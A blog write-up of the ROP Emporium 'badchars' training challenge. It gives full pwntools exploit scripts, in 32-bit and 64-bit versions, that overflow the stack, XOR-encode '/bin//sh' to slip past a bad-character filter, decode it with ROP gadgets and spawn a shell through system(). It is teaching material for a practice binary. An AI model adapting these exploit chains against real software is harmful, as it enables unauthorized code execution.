---
layout: post
title: ROP Emporium - Badchars
tags: [rop]
---

<p align="center">
  <img src="https://raw.githubusercontent.com/arvandy/arvandy.github.io/master/img/rop/badchars.PNG">
</p>
<br>

**Badchars 32 Bit**
<br><br>
<p align="justify">
Overall the objective still same, write "/bin/sh" string into memory and then execute system command with "/bin/string" as the argument, but we need to handle the Badchars (Bad Characters) in this challenge. Badchars are any character(s) that can terminate our crafted payload, such as null character ("\x00"), carriage return ("\x0D"), newline ("\x0A"), etc. So we need to make sure the payload that we crafted not containing any badchars. If we run the binary, it will print the information about which characters are the Badchars.
<br><br></p>

```bash
root@Perseverance:~/rop_emporium/badchars32# ./badchars32
badchars by ROP Emporium
32bits

badchars are: b i c / <space> f n s
> 
```
<br>

We have eight bad characters: [b i c / <space> f n s]  or  [0x62, 0x69, 0x63, 0x2f, 0x20, 0x66, 0x6e, 0x73] in Hexadecimal.<br><br>

One of the ways to avoid Badchars is by encoding the payload using XOR operation. The idea is to encode the payload before sending it and then decodes after it already written in the memory. First, let's find the EIP offset using Radare2.<br><br>

```bash
root@Perseverance:~/rop_emporium/badchars32# r2 -de dbg.profile=profile.rr2 badchars32
Process with PID 4504 started...
= attach 4504 4504
bin.baddr 0x08048000
Using 0x8048000
asm.bits 32
glibc.fc_offset = 0x00148
[0xf7fc00b0]> dc
badchars by ROP Emporium
32bits

badchars are: b i c / <space> f n s
> child stopped with signal 11
[+] SIGNAL 11 errno=0 addr=0x41415041 code=1 ret=0
[0x41415041]> wopO `dr eip`
44
```
<br>

EIP offset is 44. Find the writable memory section using `readelf` command.<br><br>

```bash
root@Perseverance:~/rop_emporium/badchars32# readelf --sections badchars32
There are 31 section headers, starting at offset 0x1a3c:

Section Headers:
  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
  [ 0]                   NULL            00000000 000000 000000 00      0   0  0
  [ 1] .interp           PROGBITS        08048154 000154 000013 00   A  0   0  1
  [ 2] .note.ABI-tag     NOTE            08048168 000168 000020 00   A  0   0  4
  [ 3] .note.gnu.build-i NOTE            08048188 000188 000024 00   A  0   0  4
  [ 4] .gnu.hash         GNU_HASH        080481ac 0001ac 000030 04   A  5   0  4
  [ 5] .dynsym           DYNSYM          080481dc 0001dc 000110 10   A  6   1  4
  [ 6] .dynstr           STRTAB          080482ec 0002ec 000099 00   A  0   0  1
  [ 7] .gnu.version      VERSYM          08048386 000386 000022 02   A  5   0  2
  [ 8] .gnu.version_r    VERNEED         080483a8 0003a8 000020 00   A  6   1  4
  [ 9] .rel.dyn          REL             080483c8 0003c8 000020 08   A  5   0  4
  [10] .rel.plt          REL             080483e8 0003e8 000058 08  AI  5  24  4
  [11] .init             PROGBITS        08048440 000440 000023 00  AX  0   0  4
  [12] .plt              PROGBITS        08048470 000470 0000c0 04  AX  0   0 16
  [13] .plt.got          PROGBITS        08048530 000530 000008 00  AX  0   0  8
  [14] .text             PROGBITS        08048540 000540 0003c2 00  AX  0   0 16
  [15] .fini             PROGBITS        08048904 000904 000014 00  AX  0   0  4
  [16] .rodata           PROGBITS        08048918 000918 000063 00   A  0   0  4
  [17] .eh_frame_hdr     PROGBITS        0804897c 00097c 00004c 00   A  0   0  4
  [18] .eh_frame         PROGBITS        080489c8 0009c8 00014c 00   A  0   0  4
  [19] .init_array       INIT_ARRAY      08049f08 000f08 000004 00  WA  0   0  4
  [20] .fini_array       FINI_ARRAY      08049f0c 000f0c 000004 00  WA  0   0  4
  [21] .jcr              PROGBITS        08049f10 000f10 000004 00  WA  0   0  4
  [22] .dynamic          DYNAMIC         08049f14 000f14 0000e8 08  WA  6   0  4
  [23] .got              PROGBITS        08049ffc 000ffc 000004 04  WA  0   0  4
  [24] .got.plt          PROGBITS        0804a000 001000 000038 04  WA  0   0  4
  [25] .data             PROGBITS        0804a038 001038 000008 00  WA  0   0  4
  [26] .bss              NOBITS          0804a040 001040 00002c 00  WA  0   0 32
  [27] .comment          PROGBITS        00000000 001040 000034 01  MS  0   0  1
  [28] .shstrtab         STRTAB          00000000 00192f 00010a 00      0   0  1
  [29] .symtab           SYMTAB          00000000 001074 000570 10     30  52  4
  [30] .strtab           STRTAB          00000000 0015e4 00034b 00      0   0  1
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),
  L (link order), O (extra OS processing required), G (group), T (TLS),
  C (compressed), x (unknown), o (OS specific), E (exclude),
  p (processor specific)
```
<br>

The .data section is writable. We will write the "/bin/sh" string into .data section but we need to write a few bytes after the start address because of the start address (0x0804a038) used by libc. In this case, I will write the string into "0x0804a03C" or 5 bytes after start address.<br><br>

Below python script will XOR each character from "/bin//sh" string with a value (start from 0x00 and will increase by 1 if the result is in BadChars list) and then save what value it's being XOR-ed with.<br><br>

```bash
for i in sh_string:                                                                                                                        
encoded = ord(i) ^ xored_value[pos]                                                                                                    
while encoded in badchars:                                                                                                             
    xored_value[pos] += 1                                                                                                          
    encoded = ord(i) ^ xored_value[pos]                                                                                            
encoded_sh_string += chr(encoded)                                                                                                      
pos += 1
```
<br>

After encoding the "/bin//sh" strings, we need to find ROP chain to write the encoded strings into .data section using ROPGadget.<br><br>

```python
# ROPChain to write the encoded_sh_string into .data section
rop = p32(0x08048899)               # pop esi ; pop edi ; ret
rop += encoded_sh_string[:4]        # Write encoded "/bin" into ESI
rop += p32(data_addr)               # Write destination address into EDI
rop += p32(0x08048893)              # mov dword ptr [edi], esi ; ret (Move ESI value (encoded "/bin") into address that pointed by EDI)

rop += p32(0x08048899)              # pop esi ; pop edi ; ret
rop += encoded_sh_string[4:]        # Write encoded "//sh" into ESI
rop += p32(data_addr+4)             # Write 4 bytes after destination address into EDI
rop += p32(0x08048893)              # mov dword ptr [edi], esi ; ret (Move ESI value (encoded "//sh") into address that pointed by EDI)
```
<br>

On this point, we have successfully avoiding BadChars, now we need to find the ROPGadget to decode the encoded "/bin//sh" strings since the binary won't understand the encoded strings. After decoding, we can call the system_plt using the "/bin//sh" as the argument to get the Shell.<br><br>

```python
# ROPChain to decode the encoded_sh_string
temp = data_addr
for i in range (0,8):
    rop += p32(0x08048896)                  # pop ebx ; pop ecx ; ret
    rop += p32(temp)                        # Write destination address into EBX
    rop += p32(xored_value[i])              # Write the xored_value into ECX
    rop += p32(0x08048890)                  # xor byte ptr [ebx], cl ; ret (XOR 1 byte of ECX with 1 byte of EBX)
    temp += 1                               # Increment the destination address by 1 
```
<br>

Below is a simple python script using pwntools to automate the process.<br><br>

```python
#!/usr/bin/python
from pwn import *

def main():
    junk = "A" * 44             # EIP Offset at 44
    sh_string = "/bin//sh"
    encoded_sh_string = ""
    badchars = [0x62, 0x69, 0x63, 0x2f, 0x20, 0x66, 0x6e, 0x73]	
    xored_value = [0x0]*8       # XOR value array
    pos = 0
    data_addr = 0x0804a038 + 5  # .data section address +5 to write /bin//sh string

    # Encode the /bin//sh string using XOR to avoid badchars
    for i in sh_string:
        encoded = ord(i) ^ xored_value[pos]
        while encoded in badchars:
		xored_value[pos] += 1
		encoded = ord(i) ^ xored_value[pos]
	encoded_sh_string += chr(encoded)
	pos += 1

    # ROPChain to write the encoded_sh_string into .data section
    rop = p32(0x08048899)           # pop esi ; pop edi ; ret
    rop += encoded_sh_string[:4]    # Write encoded "/bin"
    rop += p32(data_addr)           # Data section address
    rop += p32(0x08048893)          # mov dword ptr [edi], esi ; ret

    rop += p32(0x08048899)          # pop esi ; pop edi ; ret
    rop += encoded_sh_string[4:]    # Write encoded "//sh"
    rop += p32(data_addr+4)         # Data section address
    rop += p32(0x08048893)          # mov dword ptr [edi], esi ; ret

    # ROPChain to decode the encoded_sh_string
    temp = data_addr
    for i in range (0,8):
	rop += p32(0x08048896)      # pop ebx ; pop ecx ; ret
	rop += p32(temp)            # Data section address
	rop += p32(xored_value[i])  # the xored_value
	rop += p32(0x08048890)      # xor byte ptr [ebx], cl ; ret
	temp += 1                   # Move 1 byte

    system_plt = p32(0x80484e0)
    p = process("./badchars32")
    payload = junk + rop + system_plt + "BBBB" + p32(data_addr)

    p.sendlineafter("s\n> ", payload)
    p.interactive()

if __name__ == "__main__":
    main()
```
<br>

Run the script and get the Shell.<br><br>

```bash
root@Perseverance:~/rop_emporium/badchars32# ./badchars32.py 
[+] Starting local process './badchars32': pid 12794
[*] Switching to interactive mode
$ id
uid=0(root) gid=0(root) groups=0(root)
$ cat flag.txt
ROPE{a_placeholder_32byte_flag!}
```
<br><br>
**Badchars 64 Bit**
<br><br>
Let's find the RIP offset using Radare2.<br><br>

```bash
root@Perseverance:~/rop_emporium/badchars# r2 -de dbg.profile=profile.rr2 badchars
Process with PID 11193 started...
= attach 11193 11193
bin.baddr 0x00400000
Using 0x400000
asm.bits 64
[0x7f8a6d353090]> dc
badchars by ROP Emporium
64bits

badchars are: b i c / <space> f n s
> child stopped with signal 11
[+] SIGNAL 11 errno=0 addr=0x00000000 code=128 ret=0
[0x004009de]> pxq 8@rsp
0x7ffeb74aca58  0x41415041414f4141                       AAOAAPAA
[0x004009de]> wopO 0x41415041414f4141
40
[0x004009de]> 
```
<br>

RIP offset is 40. Find the writable memory section using `readelf` command.<br><br>

```bash
root@Perseverance:~/rop_emporium/badchars# readelf --sections badchars
There are 31 section headers, starting at offset 0x1d08:

--snipped--
  [19] .init_array       INIT_ARRAY       0000000000600e10  00000e10
       0000000000000008  0000000000000000  WA       0     0     8
  [20] .fini_array       FINI_ARRAY       0000000000600e18  00000e18
       0000000000000008  0000000000000000  WA       0     0     8 
  [21] .jcr              PROGBITS         0000000000600e20  00000e20
       0000000000000008  0000000000000000  WA       0     0     8   
  [22] .dynamic          DYNAMIC          0000000000600e28  00000e28
       00000000000001d0  0000000000000010  WA       6     0     8   
  [23] .got              PROGBITS         0000000000600ff8  00000ff8
       0000000000000008  0000000000000008  WA       0     0     8   
  [24] .got.plt          PROGBITS         0000000000601000  00001000
       0000000000000070  0000000000000008  WA       0     0     8   
  [25] .data             PROGBITS         0000000000601070  00001070
       0000000000000010  0000000000000000  WA       0     0     8   
  [26] .bss              NOBITS           0000000000601080  00001080
       0000000000000030  0000000000000000  WA       0     0     32  
--snipped--
```
<br>

The .data section is writable. We will write the "/bin/sh" string into .data section but we need to write a few bytes after the start address because of the start address (0x601070) used by libc. In this case, I will write the string into "0x601074" or 4 bytes after start address.<br><br>

Below python script will XOR each character from "/bin//sh" string with a value (start from 0x00 and will increase by 1 if the result is in BadChars list) and then save what value it's being XOR-ed with. <br><br>

```python
for i in sh_string:                                                                                                                        
encoded = ord(i) ^ xored_value[pos]                                                                                                    
while encoded in badchars:                                                                                                             
    xored_value[pos] += 1                                                                                                          
    encoded = ord(i) ^ xored_value[pos]                                                                                            
encoded_sh_string += chr(encoded)                                                                                                      
pos += 1
```
<br>

After encoding the "/bin//sh" strings, we need to find ROP chain to write the encoded strings into .data section using ROPGadget.<br><br>

```python
# ROPChain to write the encoded_sh_string into .data section
rop = p64(0x0000000000400b3b)       # pop r12; pop r13; ret
rop += encoded_sh_string            # Write Encoded "/bin//sh" into R12
rop += p64(data_addr)               # Write destination address into R13
rop += p64(0x0000000000400b34)      # mov qword ptr [r13], r12 ; ret (Move R12 value into the address that pointed by R13)
```
<br>

On this point, we have successfully avoiding BadChars, now we need to find the ROPGadget to decode the encoded "/bin//sh" strings since the binary won't understand the encoded strings. After decoding, we can call the system_plt using the "/bin//sh" as the argument to get the Shell.<br><br>

```python
# ROPChain to decode the encoded_sh_string
temp = data_addr
for i in range (0,8):
    rop += p64(0x0000000000400b40)          # pop r14 ; pop r15 ; ret
    rop += p64(xored_value[i])              # write the xored value into R14
    rop += p64(temp)                        # write the destination address into R15
    rop += p64(0x0000000000400b30)          # xor byte ptr [r15], r14b ; ret (XOR 1 byte of R15 with 1 byte of R14)
    temp += 1                               # Increment the destination address by 1
```
<br>

Below is a simple python script using pwntools to automate the process.<br><br>

```python
#!/usr/bin/python
import sys
from pwn import *

def main():
    junk = "A" * 40         # RIP Offset at 40
    sh_string = "/bin//sh"
    encoded_sh_string = ""
    badchars = [0x62, 0x69, 0x63, 0x2f, 0x20, 0x66, 0x6e, 0x73]
    xored_value = [0x0]*8   # XOR valued array
    pos = 0
    data_addr = 0x601074    # .data section address

    # Encode the /bin//sh string using XOR to avoid badchars
    for i in sh_string:
    	encoded = ord(i) ^ xored_value[pos]
    	while encoded in badchars:
    		xored_value[pos] += 1
    		encoded = ord(i) ^ xored_value[pos]
    	encoded_sh_string += chr(encoded)
    	pos += 1

    # ROPChain to write the encoded_sh_string into .data section
    rop = p64(0x0000000000400b3b)       # pop r12; pop r13; ret
    rop += encoded_sh_string            # Encoded SH STRING
    rop += p64(data_addr)               # Data section address
    rop += p64(0x0000000000400b34)      # mov qword ptr [r13], r12 ; ret

    # ROPChain to decode the encoded_sh_string
    temp = data_addr
    for i in range (0,8):
    	rop += p64(0x0000000000400b40)  # pop r14 ; pop r15 ; ret
    	rop += p64(xored_value[i])      # the xored_value
    	rop += p64(temp)                # Data section address
    	rop += p64(0x0000000000400b30)  # xor byte ptr [r15], r14b ; ret
    	temp += 1                       # Move 1 byte

    rop += p64(0x0000000000400b39)      # pop rdi; ret
    system_addr = p64(0x4006f0)
    p = process("./badchars")
    payload = junk + rop + p64(data_addr) + system_addr

    p.sendlineafter("s\n> ", payload)
    p.interactive()

if __name__ == "__main__":
    main()
```
<br>

Run the script and get the Shell.<br><br>

```bash
root@Perseverance:~/rop_emporium/badchars# ./badchars.py 
[+] Starting local process './badchars': pid 11396
[*] Switching to interactive mode
$ id
uid=0(root) gid=0(root) groups=0(root)
$ cat flag.txt
ROPE{a_placeholder_32byte_flag!}
```
<br><br>
